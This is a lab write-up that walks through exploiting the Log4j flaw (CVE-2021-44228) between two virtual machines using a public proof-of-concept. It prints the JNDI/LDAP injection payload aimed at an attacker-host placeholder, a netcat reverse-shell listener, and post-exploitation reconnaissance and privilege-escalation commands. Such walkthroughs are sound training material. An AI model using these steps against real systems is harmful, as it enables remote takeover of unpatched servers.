# **Documentation: Exploiting the Log4j Vulnerability**

## **Introduction**

This document provides a comprehensive guide on exploiting the Log4j vulnerability (CVE-2021-44228) using two separate Kali Linux virtual machines. The attack simulates a real-world scenario where an attacker compromises a vulnerable system by exploiting a logging flaw. This documentation includes detailed steps on setting up the environment, executing the exploit, and exploring the compromised system.

---

## **Environment Setup**

### **Victim Machine Setup**

**1. Install Docker:**

Docker is used to run a vulnerable application in an isolated environment on the victim machine. This setup ensures that the testing environment is controlled and does not affect other systems.

```bash
sudo apt update
sudo apt install docker.io -y
```

**2. Clone the Log4j PoC Repository:**

The Proof of Concept (PoC) repository contains the necessary files and scripts to simulate the Log4j vulnerability. Cloning this repository gives access to vulnerable applications and exploit tools.

```bash
sudo git clone https://github.com/kozmer/log4j-shell-poc
cd log4j-shell-poc
```

**3. Build the Docker Image:**

The Docker image is built from the cloned repository. This image includes the vulnerable application that will be exposed to the attacker.

```bash
sudo docker build -t log4j-shell-poc.
```

**4. Run the Vulnerable Application:**

The Docker container is run with network settings that expose it to the network, making it accessible for testing.

```bash
sudo docker run --network host log4j-shell-poc
```

The application is now accessible at `http://<Victim_VM_IP>:8080`.

**5. Verify the Application:**

To confirm that the vulnerable application is running, open a web browser on the victim machine and navigate to `http://localhost:8080`.

---

### **Attacker Machine Setup**

**1. Install Dependencies:**

On the attacker machine, update the system and install Python along with other necessary tools. These tools are required to execute the PoC script that will perform the exploit.

```bash
sudo apt update
sudo apt install python3-pip -y
```

**2. Clone the Log4j PoC Repository:**

Similarly, clone the PoC repository on the attacker's machine. This repository contains the scripts needed to exploit the Log4j vulnerability.

```bash
sudo git clone https://github.com/kozmer/log4j-shell-poc
cd log4j-shell-poc
```

**3. Install Python Dependencies:**

Install the required Python libraries listed in the `requirements.txt` file. These dependencies are essential for the PoC script to run correctly.

```bash
pip3 install -r requirements.txt
```

---

## **Running the Exploit**

### **Setting Up the PoC Script**

**1. Execute the PoC Script:**

Run the PoC script on the attacker machine. This script sets up both an LDAP server and a web server, which will be used to deliver the malicious payload to the victim's machine.

```bash
sudo python3 poc.py --userip <Attacker_VM_IP> --webport 8000 --lport 9001
```

- `<Attacker_VM_IP>`: Replace this with the actual IP address of the attacker machine.

The script generates a malicious payload string, which looks like this:

```plaintext
${jndi:ldap://<Attacker_VM_IP>:1389/a}
```

This payload is designed to exploit the Log4j vulnerability by making the victim's application log it, thereby triggering remote code execution.

### **Setting Up the Netcat Listener**

**1. Listen for the Reverse Shell:**

On the attacker machine, set up a Netcat listener on port 9001. This listener will catch the reverse shell connection from the victim machine after the exploit is triggered.

```bash
nc -lvnp 9001
```

---

## **Triggering the Exploit**

### **Injecting the Malicious Payload**

**1. Access the Vulnerable Application:**

Open the vulnerable application on the victim machine by navigating to `http://<Victim_VM_IP>:8080` in a web browser.

**2. Paste the Payload:**

Find an input field (such as a search bar or log entry field) in the vulnerable application and paste the following malicious payload:

```plaintext
${jndi:ldap://<Attacker_VM_IP>:1389/a}
```

This payload will be logged by the application, causing it to connect to the attacker's LDAP server.

### **Executing the Payload**

**1. Establishing the Connection:**

When the victim application processes the payload, it reaches out to the attacker's LDAP server and retrieves a malicious Java class. This results in the establishment of a reverse shell connection to the attacker VM.

---

## **Exploring the Victim Machine**

### **System Information Gathering**

**1. Check the Current User:**

Identify the user under which the reverse shell is operating:

```bash
whoami
```

**2. View System Information:**

Gather detailed information about the victim's system:

```bash
uname -a
```

**3. List Files and Directories:**

Explore the file system by listing files and directories:

```bash
ls -la
```

### **Network and Process Exploration**

**1. View Network Configuration:**

Inspect the network interfaces and their configurations:

```bash
ifconfig
```

**2. List Running Processes:**

Check the processes currently running on the victim machine:

```bash
ps aux
```

### **Privilege Escalation Attempts**

**1. Check for Sudo Privileges:**

Determine if the current user has any sudo privileges:

```bash
sudo -l
```

**2. Explore SUID Files:**

Search for SUID files that could potentially be used for privilege escalation:

```bash
find / -perm -4000 -type f 2>/dev/null
```

---

## **Outcome and Learnings**

**1. Understanding the Vulnerability:**

The Log4j vulnerability allows attackers to inject and execute malicious code through the logging mechanism of an application. This exercise successfully demonstrated how an attacker could gain unauthorized access to a system by exploiting this vulnerability.

**2. Security Implications:**

This attack highlights the critical need for organizations to promptly apply patches and updates to their systems. Failure to do so could lead to significant security breaches, allowing attackers to take control of affected systems.

**3. Ethical Considerations:**

Itâ€™s important to note that all actions were performed in a controlled environment to improve security practices. Unauthorized exploitation of vulnerabilities is illegal and unethical.

---

## **Conclusion**

This documentation provides a step-by-step guide to exploiting the Log4j vulnerability using two VMs. The attack was carried out by setting up a vulnerable application on one VM and executing the exploit from another, demonstrating the real-world implications of this vulnerability. The exercise emphasized the importance of maintaining strong security practices, including timely patching and thorough monitoring of systems.

---
